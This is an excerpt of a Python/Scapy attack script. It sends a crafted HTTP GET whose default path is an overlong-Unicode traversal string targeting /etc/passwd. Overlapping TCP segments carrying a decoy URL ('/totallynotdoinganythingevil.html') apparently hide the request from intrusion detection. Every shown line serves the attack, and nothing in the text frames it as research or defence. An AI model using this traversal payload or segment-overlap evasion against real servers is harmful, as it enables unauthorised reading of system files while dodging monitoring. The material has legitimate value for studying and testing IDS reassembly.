...
parser.add_argument("--url", help = "URL to GET | default = '/..%c1%1c../etc/passwd'", 
                    type = str, nargs = '?', const = 1, default = '/..%c1%1c../etc/passwd')
parser.add_argument("--overlap-url", help = "URL to GET | default = '/totallynotdoinganythingevil.html'",
                    type = str, nargs = '?', const = 1, default = '/totallynotdoinganythingevil.html')
...
# HTTP headers
http_data = "ET " + http_url + " HTTP/1.1\r\nHost: " + http_host + "\r\n\r\n"
...
# Send stream
http_tcp = TCP(sport = src_port, dport = dst_port, flags = 'A', seq = tcp_seq + 1, ack = tcp_ack)
send(ip/http_tcp/http_data)

http_overlap_tcp = TCP(sport = src_port, dport = dst_port, flags = 'A', seq = tcp_seq, ack = tcp_ack)
send(ip/http_overlap_tcp/http_overlap_data)
